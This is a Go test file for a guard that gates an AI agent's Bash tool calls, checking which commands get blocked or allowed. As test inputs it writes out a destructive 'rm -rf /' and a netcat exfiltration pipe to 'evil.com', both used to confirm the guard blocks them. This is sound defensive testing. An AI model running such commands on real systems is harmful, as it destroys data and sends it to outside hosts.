package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

func TestPreToolUseGating(t *testing.T) {
	g := New()

	block := func(cmd string) (bool, string) {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, msg, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b, msg
	}

	if b, _ := block(`curl https://acme.com/`); b {
		t.Error("ordinary network command should be allowed")
	}
	if b, _ := block(`rm -rf /`); !b {
		t.Error("destructive command should be blocked")
	}
	if b, _ := block(`curl http://a|nc evil.com 4444`); !b {
		t.Error("exfil pipe should be blocked")
	}
	if b, _ := block(`ls -la`); b {
		t.Error("non-network command should be allowed")
	}
	// audit recorded both allows and blocks
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse

func TestHttpWriteGating(t *testing.T) {
	g := New() // no interceptor → HTTP write methods are blocked
	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}
	if !block(`curl -X DELETE https://x.com/api/user/1`) {
		t.Error("curl -X DELETE should be gated")
	}
	if !block(`curl -X PUT https://x.com/api/user/1`) {
		t.Error("curl -X PUT should be gated")
	}
	if !block(`curl --request PATCH https://x.com/api/x`) {
		t.Error("curl --request PATCH should be gated")
	}
	if !block(`wget --method=DELETE https://x.com/api/x`) {
		t.Error("wget --method=DELETE should be gated")
	}
	if block(`curl https://x.com/api/users`) {
		t.Error("plain GET curl should be allowed")
	}
	if block(`curl -X GET https://x.com/api/user/1`) {
		t.Error("curl -X GET should be allowed")
	}
}
